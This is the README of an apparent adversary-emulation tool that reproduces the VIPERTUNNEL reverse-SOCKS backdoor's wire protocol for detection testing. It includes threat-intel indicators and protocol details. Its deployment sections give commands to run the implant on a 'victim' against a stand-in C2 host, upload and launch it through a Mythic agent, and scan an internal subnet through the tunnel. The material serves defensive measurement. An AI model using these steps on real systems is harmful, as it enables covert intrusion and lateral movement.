# vipertunnel

A reverse SOCKS5 tunnel, reimplemented **faithfully on the wire** and
deliberately nowhere else, so that a network-side detection can be measured
against this family's traffic.

- `client/` — the implant half, and `start-client.sh`
- `server/` — the counterpart the family never published, and `start-server.sh`

Both are Python 3, standard library only, no install step.

## Why this exists, and what it is not

The original is the Python reverse-SOCKS backdoor InfoGuard Labs documented
in *Slithering Through the Noise* (2026-04-09). Only its **client** was ever
published; the server side was not. So the server here is written to a
derivation of the client's bytes rather than to a sample, and where the two
disagree the client is right — it is the artefact that was observed.

**This reproduces the wire and nothing else.** None of the published class
names, credentials or typos are here, because the published YARA rules key
on exactly those, and a file that trips a file-based rule gets quarantined by
the very endpoints it is supposed to run on. This is a network-layer
exercise; if you want to validate YARA too, that is a different artefact and
a different decision.

## Provenance

### Who named it, and when

The family was reported twice in two days, from different directions, and
the name came from the second:

| Date | Who | What |
|---|---|---|
| 2025-01-15 | GuidePoint Security (GRIT) | First public write-up: a Python backdoor used by a RansomHub affiliate, delivered by SocGholish |
| 2025-01-16 | Google, *Threat Horizons* H1 2025 | Named it **VIPERTUNNEL** and tied it to **UNC2165** |
| 2025-03-14 | Trend Micro | Confirmed the SocGholish → RansomHub chain and observed the same backdoor dropped |
| 2026-04-09 | InfoGuard Labs, *Slithering Through the Noise* | The deep dive this reimplementation is derived from |

Names for the same things differ by vendor, which matters when reading
across reports: EvilCorp is **UNC2165** to Google and **Manatee Tempest** to
Microsoft; SocGholish is **FAKEUPDATES** to Google and **Mustard Tempest**
(operators) to Microsoft, and **Water Scylla** to Trend Micro.

**Malpedia has no entry for the family** — `py.vipertunnel` was a 404 when
checked. It does carry the actors (UNC2165, EvilCorp, DragonForce,
RansomHub) and `js.fakeupdates`.

### Attribution, and one thing to know before you emulate it

Attributed to **UNC2165 / EvilCorp** by Google Threat Horizons and GuidePoint,
typically as a follow-on to a FAKEUPDATES infection, with the access then
monetised or sold on — RansomHub in the reported cases. In the incident
InfoGuard analysed the ransomware was DragonForce, and they say plainly there
is **insufficient evidence** the access was transferred to them.

**EvilCorp has been under US sanctions since 2019 (OFAC).** That is a fact
about the actor, not about this code, but it is the reason their tooling gets
unusual attention — and a reason to keep an emulation of it inside a lab you
own and can account for.

### What independent sources say about the protocol

Useful because it corroborates the derivation in this repository from a
different sample set. GuidePoint, reading their own sample a year before the
InfoGuard write-up, reported that it:

- uses "a tunnel **heavily based on the SOCKS5 protocol, although the
  protocol is not fully implemented**" — which is the dialect in the table
  above;
- **supports only TCP** tunnelled traffic and **lacks IPv6 support** — both
  reproduced here, and both refused the way the original refuses them;
- connects to **hardcoded IP addresses** over TCP;
- reads as possibly AI-assisted: "overly descriptive method names and
  variables, lengthy debug messages, and detailed logging for unsupported
  address types and unimplemented sections of the SOCKS5 protocol."

That last point identifies **which variant** that was. InfoGuard's clustering
splits the family into four, and the verbose, argparse-carrying, heavily
logging shape is the third:

| Cluster | When | Shape |
|---|---|---|
| Early development | ~Dec 2023 | No hardcoded C2, spelling errors, unused variables, no obfuscation observed |
| Adoption of public tooling | ~Sep 2024 | Minified to single-character identifiers, PyOBFUSCATE loader, C2 still from `argv` |
| **Refinement & debugging** | Dec 2024 – Sep 2025 | Re-expanded, `argparse` debug flag, verbose logging, **first hardcoded C2** |
| Modern production variant | Sep 2025 – Dec 2025 | Refactored to `Wire` / `Relay` / `Commander`, logging and `argparse` removed, port hardcoded |

**This repository implements the wire of all four and the code shape of
none.** The published client that the derivation came from is a cluster-three
sample; the wire did not change across the clusters, which is what makes a
wire-faithful reimplementation meaningful rather than version-specific. The
class names, the credential pair and the typos are cluster-identifying
strings and are deliberately absent — see the note at the top.

One consequence of the dialect worth knowing if you compare notes with other
emulations: a **public simulation of this family sends `05 01 00`**, the RFC
1928 greeting. The real client reads the first byte as `nmethods`, so `05`
makes it wait for five method bytes that never come. An RFC greeting does not
talk to this family, which is exactly what the "no version byte" row above
means in practice.

### Infrastructure, and how far an emulation goes

From InfoGuard's hunting, and worth reading as a checklist of what your own
test server will and will not resemble:

| Trait | The real thing | This server |
|---|---|---|
| `00 00` on a bare probe to the C2 port | yes — the fingerprint that enumerated the fleet | **yes**, deliberately |
| Command port 443 | yes | yes, by default |
| A spread of five-digit relay ports | yes | yes, one ephemeral listener per pending session |
| Plaintext SOCKS over 443, not wrapped in TLS | yes | yes |
| Port 22 open alongside 443 | ~75% returning `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13`, i.e. Ubuntu 22.04 LTS | your host's business, not this tool's |
| Pyramid C2 on port 8000, answering HTTP 401 | often, with `WWW-Authenticate: Basic realm="Proxy"` instead of Pyramid's default `"Demo Realm"` | no — out of scope |
| Geolocation | 100% of identified IPs in the United States | your lab |

The Censys hunts InfoGuard published, for anyone wanting to find the real
infrastructure rather than emulate it:

```
host.services.banner_hex = "0000" AND host.services.protocol: "SSH" AND "python" AND "basehttp"
```

```
host.services.endpoints: (http.status_code: 401 and http.headers: (key: "Server" and value: "BaseHTTP")
  and http.headers: (key: "WWW-Authenticate" and value: "Basic realm=\"Proxy\""))
```

The HTTP 401 body hash they pivot on is
`537a7628eb1b2fe117c9081e65579397a4d9b63f227802cac4028f4c34e2b337`, which
other services including VirusTotal can be queried with.

### Samples and indicators

InfoGuard's samples are in a **VirusTotal collection**:
`9aad0660aab454640f1de14d4a91a9aa9fca878dafce032f4f0ade1c351eb67e`. Their
appendix lists 32 high-confidence C2 servers with ASN, ISP and first/last
seen. Rather than copy that table, here are the entries an independent
review (CyberVeille, 2026-04) **confirmed against third-party sources** —
which is the subset worth most to a hunter:

| Indicator | Corroboration |
|---|---|
| `38.146.28.93` | VirusTotal 16/94, ThreatFox (RansomHub) |
| `38.135.54.24` | VirusTotal 13/94, ThreatFox (RansomHub) |
| `carryingitall.com` | VirusTotal 5/94 |
| `rentiantech.com` | VirusTotal 3/94 |
| `chateaugalicia.com` | VirusTotal 4/94 |

The same review counted 43 IOCs in the write-up, 5 of 6 spot-checked
confirmed against AbuseIPDB, ThreatFox, URLhaus and VirusTotal, and 13 MITRE
techniques. Note that `38.146.28.93` is the default C2 baked into the
published cluster-three client — so it is both an indicator and the thing a
careless copy of that sample would dial. **Nothing in this repository
contains a C2 address.**

### MITRE ATT&CK

As mapped by third parties across the family, not by this tool: **T1059.006**
(Python), **T1053.005** (Scheduled Task), **T1546.001** (Change Default File
Association), **T1027** and **T1027.002** (Obfuscation, Software Packing),
**T1090.001** / **T1090.002** / **T1090.003** (Internal, External and
Multi-hop Proxy), **T1572** (Protocol Tunnelling), **T1573** (Encrypted
Channel), **T1102** (Web Service).

What *this* repository exercises is the proxy and tunnelling set — T1090 and
T1572. The persistence, obfuscation and packing techniques are the delivery
chain, and none of it is here.

### Related tooling in the same cluster

- **ShadowCoil** (also **COILCAGE** or **RATTLEGRAB**) — a Python credential
  stealer sharing the same multi-stage packer, which is what links the two to
  one activity cluster. It targets Chromium browsers and, per InfoGuard, also
  Firefox. Its obfuscation adds a Linux `/proc/self/status` `TracerPid`
  anti-debug check in a Windows-targeting payload, which suggests the packer
  is cross-platform.
- **Pyramid** — an open-source post-exploitation framework found on the same
  infrastructure, usually on port 8000, used to run Python in memory via
  `python.exe`. The operators' deployments are identifiable by the modified
  `Basic realm="Proxy"` in its 401 response.

### Reading list

- InfoGuard Labs, *Slithering Through the Noise* — https://labs.infoguard.ch/posts/slithering_through_the_noise/
- GuidePoint Security — https://www.guidepointsecurity.com/blog/ransomhub-affiliate-leverage-python-based-backdoor/
- Google, *Threat Horizons* H1 2025 — https://services.google.com/fh/files/misc/threat_horizons_report_h1_2025.pdf
- eSentire, *Socket Puppet* — https://www.esentire.com/blog/socket-puppet-how-ransomhub-affiliates-pull-the-strings
- eSentire, ShadowCoil unpacking — https://www.esentire.com/blog/unpacking-shadowcoils-ransomhub-ex-affiliate-credential-harvesting-tool
- Intrinsec, Eye Pyramid IP cluster — https://www.intrinsec.com/ip-cluster-linking-ransomware-activity-and-eye-pyramid-c2/
- hunt.io, tracking Pyramid C2 — https://hunt.io/blog/tracking-pyramid-c2-identifying-post-exploitation-servers
- BushidoToken, *Tracking Adversaries: EvilCorp* — https://blog.bushidotoken.net/2025/04/tracking-adversaries-evilcorp-ransomhub.html
- Trend Micro, SocGholish → RansomHub — https://www.trendmicro.com/en_us/research/25/c/socgholishs-intrusion-techniques-facilitate-distribution-of-rans.html
- Pyramid — https://github.com/naksyn/Pyramid

## Deploying it behind a proxy, and whether Mythic helps

### Ask the proxy first

The tunnel needs exactly one thing from a proxy: `CONNECT <host>:443`,
followed by bytes that are neither TLS nor HTTP. Whether a given proxy will
do that is not something to find out after deploying, so `preflight/` asks:

```
# on the host that will run the server
./preflight/proxy-preflight.py --echo-server 0.0.0.0:443

# on the host that will carry the implant
./preflight/proxy-preflight.py --proxy 127.0.0.1:3128 --echo 203.0.113.9:443
.\preflight\proxy-preflight.ps1 -Proxy 10.0.0.9:8080 -Echo 203.0.113.9:443
```

Three verdicts, and only the last is a deployable path:

| Verdict | Meaning |
|---|---|
| **REFUSED** | a destination allowlist turned the CONNECT down |
| **PERMITTED** | the CONNECT returned 200, and nothing proved the bytes survive |
| **CARRIED** | a listener you control echoed a known string back **intact** |

The middle one is why this exists. A proxy that permits the CONNECT and then
terminates or rewrites the stream leaves a deployment that looks fine and a
handshake that dies for a reason reading as a server fault. The preflight
therefore does not stop at the `200` — it requires a byte-for-byte echo, and
it reports an altered stream separately from a refused one. Exit code is `0`
only for CARRIED.

The PowerShell version exists because the host that most needs a preflight is
the one with no Python — which is precisely the host this family brings its
own interpreter to.

### The two proxy shapes, and what each means for the measurement

**A proxy that filters nothing** passes the CONNECT and moves bytes it does
not inspect. The tunnel is deployable, and the implant's `--proxy` should
point at whatever the host really uses — including a local relay, if the host
reaches an authenticating corporate proxy through one. That is the common
shape for a Linux host with a loopback relay in front of it.

**A proxy with a destination allowlist closes this path by construction**,
and it is worth being precise about why, because the conclusion is stronger
than "we need a workaround":

- A forward proxy sees the CONNECT hostname, so the destination cannot be
  hidden from it.
- If the allowlist only passes a CDN, then a permitted CONNECT lands you on
  a CDN edge — which expects a TLS handshake and then HTTP. The tunnel's
  first byte is a method count. The edge drops it.
- No CDN configuration fixes that: a CDN forwards HTTP, not arbitrary TCP.

So on such a host the tunnel cannot run — **and neither can the family it
emulates**, which dials a hardcoded address on 443 directly and has no proxy
support at all. That is a result about the environment rather than a gap in
this tool, and it bounds where a detection for this family needs to look at
all. Record it as a finding; do not spend a day engineering around it.

### Combining it with Mythic

**As transport: no, and not for a missing-feature reason.** A Mythic C2
profile translates between an agent's transport and Mythic's own messaging.
This tunnel carries no Mythic messages — it carries SOCKS, and that is all it
carries. There is nothing for a profile to translate, so wrapping it in one
would produce a component that does nothing.

**As delivery and teardown: yes, and it is the useful combination.** An agent
already on the host can place the two files and start the client, and stop it
again afterwards — which gives a measurement a repeatable deployment and a
clean teardown without inventing either:

```
upload  client/client.py  ->  <a writable path on the host>
shell   python3 <that path> <server>:443 --proxy 127.0.0.1:3128 --ledger <path>
# ... measurement window ...
shell   pkill -f client.py
```

Two things to hold in mind when doing that during a measurement:

- **Two channels from one host at once need recording.** The agent's own
  channel and this tunnel are both on the wire, and a result attributed to
  the wrong one is worse than no result.
- **They are distinguishable by destination, which helps.** An agent fronted
  by a CDN appears under that domain; this tunnel appears as a CONNECT to an
  address on 443. A detection that groups per destination separates them on
  its own — which makes running both at once defensible, as long as the
  tunnel's destination is not shared with anything else.

**If what you want is a pivot rather than this family's traffic**, a Mythic
agent's own SOCKS feature is the better tool: it rides the agent's existing,
already-fronted transport and needs no second channel. This tool exists to
reproduce one family's wire for a measurement, and that is the only thing it
is better at.

## The wire, in one table

SOCKS5 with pieces removed. Not a variant of RFC 1928 — a dialect that
confuses anything expecting the real thing.

| Step | Bytes | How it differs from RFC 1928 |
|---|---|---|
| Command channel | server → client `uint16` **little-endian** port; `0` is a keep-alive, answered with a `0` | not in the RFC at all |
| Greeting | `nmethods \| methods` | **no version byte** |
| Method select | one byte: `0` none, `2` user/pass, `255` unacceptable | — |
| Auth | `ulen \| plen \| uname \| passwd` | RFC 1929 interleaves them as `VER ULEN UNAME PLEN PASSWD` |
| Auth reply | `1` ok, `0` fail | **inverted** |
| Request | `cmd \| atyp \| addrlen \| addr \| port(2, LE)` | no version, no RSV, `addrlen` present even for IPv4 where it is ignored, port **little-endian** |
| Reply | `status(1)`, then `atyp(1)=1 \| addrlen(1)=4 \| addr(4) \| port(2, LE)` | `1` = success |
| Then | raw bidirectional relay | — |

No BIND, no UDP ASSOCIATE, no IPv6 — all three refused, as in the original.

Two structural properties follow, and both are reproduced rather than fixed:

- **A relay connection carries no identity.** The client simply dials the
  port it was told, so the server opens one listener per pending session and
  pairs by port. That is why a scan of a real C2 of this family shows a
  spread of five-digit ports — and why whoever reached the port first could
  take the session.
- **The command port answers a bare probe with `00 00`.** That is the
  keep-alive leaking to anyone who connects, and it is the fingerprint by
  which researchers enumerated this infrastructure across hosting providers.
  Removing it would mean measuring something that is not this family.

## The measurement

### The knob, and why its effect is a step

`TIMEOUT_FOR_SOCKET_OPERATION` is 120 seconds in the original, and it applies
to the command connection's two-byte read. So the server's keep-alive
interval decides the shape of everything a proxy log records:

| `KEEPALIVE` | What the client does | What a proxy log shows |
|---|---|---|
| below 120 s | holds one TCP connection open | one CONNECT, one byte count, **no cadence** |
| `0`, or above 120 s | read deadline expires, reconnects | **a new connection every ~120 s** |

**The server cannot pick any other cadence.** If it closes a command
connection, the original client does not reconnect: it reads zero bytes,
`struct.unpack` raises, and the process exits. Only a *timeout* restarts it.
A cadence other than ~120 s therefore has to come from the client's
`--timeout`, which this exposes and labels a deviation — the client prints a
warning when it is not 120.

Measured here with `--timeout 5` to keep a test short: four connections in
eighteen seconds, each from a different local port, three timeouts, and the
server reaping each one after five seconds. That is the shape, scaled down.

### The proxy is not optional

The original dials its C2 directly and cannot cross a proxy. `--proxy` is
added here, and for this measurement it is **required rather than optional**:
a detection that reads proxy logs sees nothing at all from a host with direct
egress. The proxy leg is transport only — the bytes inside the tunnel are
unchanged, which is what keeps this faithful where the measurement cares.

Where a host reaches an authenticating corporate proxy through a local relay,
that relay is the address to give rather than the proxy itself:

```
PROXY=127.0.0.1:3128 ./client/start-client.sh c2.example.com
```

### What to expect of a periodicity detection

Worth settling before the run rather than after, because "nothing fired" is a
result and not a failed experiment:

- With a keep-alive **under** 120 s there is one long-lived CONNECT and no
  periodicity. A detection that bins per-connection events has nothing to
  work with. This is the far end of a spectrum worth knowing about: at the
  same nominal check-in rate, an agent that pools one socket produces a
  single long session while one that opens a connection per message produces
  thousands of short ones — and this tunnel is the extreme of the first kind.
- With a keep-alive of **0** there is a reconnect every ~120 s with
  near-zero jitter. That is about as easy a target as a periodicity
  detection ever gets, and if it does not fire the finding is about the
  detection rather than about the tunnel.
- The relay connections are driven by your hand on the SOCKS port. They are
  bursty, not periodic, and they are the part that carries volume.

So run both shapes. The pair is the result; either alone is an anecdote.

### Ground truth

Both halves write a ledger — one line per connection, keep-alive, relay and
session, ISO-8601 UTC:

```
server/server-ledger.log
client/client-ledger.log
```

Compare a detection's report against **those**, not against its own
timestamps. A field named for a sleep interval or a jitter does not reliably
hold one: a "jitter" can turn out to be the largest gap between contacts, and
an "average sleep" a span divided by a count. A ledger is how you notice.

## Running it

Two terminals.

```
# the server, on the host the implant can reach
sudo -E ./server/start-server.sh                 # KEEPALIVE=0 by default: cadence
KEEPALIVE=60 sudo -E ./server/start-server.sh     # one held connection instead

# the implant, on the victim
PROXY=127.0.0.1:3128 ./client/start-client.sh c2.example.com
```

Then drive traffic through the operator port, which speaks real RFC 1928:

```
curl --socks5 127.0.0.1:1080 http://10.0.0.5/
proxychains -q nmap -sT -Pn -p 445,3389 10.0.0.0/24
```

`PORT=443` is the default and worth keeping: the proxy allowlist you are
measuring through may permit `CONNECT` to 443 and nothing else, in which case
a different port measures the proxy instead of the tunnel. It needs root, or
pick a higher port knowing what you traded.

`--socks-user` / `--socks-password` put RFC 1929 credentials on the operator
port. Loopback keeps other hosts out; it does nothing about other local users
on the same box.

## Authorisation

This is adversary emulation for a detection measurement in a lab you own.
Running it anywhere else is somebody else's intrusion.
